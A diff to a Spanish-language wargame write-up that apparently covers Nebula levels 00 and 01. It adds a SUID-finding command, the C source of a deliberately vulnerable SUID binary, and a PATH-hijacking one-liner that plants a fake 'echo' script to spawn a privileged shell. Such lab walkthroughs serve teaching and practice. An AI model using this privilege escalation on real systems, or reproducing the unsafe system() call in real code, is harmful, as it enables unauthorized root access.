@@ -131,18 +131,51 @@ Como este es el nivel inicial, el usuario / contraseña es **level00** / **level
 ### Solution
 
 ```
-$ find / -perm -4000 -user level00 2>/dev/null 
+$ find / -perm -4000 -user flag00 2>/dev/null 
+# getflag
 ```
+
+La descripción del reto ya nos decia un poco acerca de donde seguir la pista, debiamos usar el man y buscar como usar `find` para que para encontrar el ejecutable con SUID de flag00 desde root hasta lo mas profundo.
 
 ---
 
 
 ### Level01
 
+Ingresamos como user/pass, level01/level01, y nos movemos a la carpeta de /home/flag01, aqui debemos encontrar un binario generado con el siguiente codigo:
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  system("/usr/bin/env echo and now what?");
+}
+```
+
 ----
 
 
 ### Solution
+
+Como pudimos ver, el binario env ejecuta confiando de las variables, el comando `echo` y le pasa a `echo` los parametros del string que mostrará en pantalla. Abusamos de la variable $PATH que hereda de quien ejecuta el binario (geteuid, getegid) y cambiamos donde encontrara a `echo`. Para ello, `echo` sera un script de `bash` que ejecute bash interactivo (`bash -i`)
+
+```
+$ printf '#!/bin/bash\nbash -i' > /tmp/echo && PATH="/tmp/:$PATH" flag01
+# getflag
+```
 
 ---
 
